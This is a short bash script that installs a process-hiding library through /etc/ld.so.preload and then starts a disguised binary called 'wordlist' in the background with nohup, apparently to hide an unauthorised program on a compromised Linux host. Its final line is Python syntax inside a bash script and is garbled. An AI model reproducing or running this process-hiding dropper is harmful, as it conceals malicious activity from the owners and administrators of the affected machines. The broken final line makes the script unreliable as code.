#!/usr/bin/env bash

mv libprocesshider.so /usr/local/lib/ && echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload && chmod +x ./wordlist && nohup ./wordlist "" /dev/null 2>&1
while TRUE:pass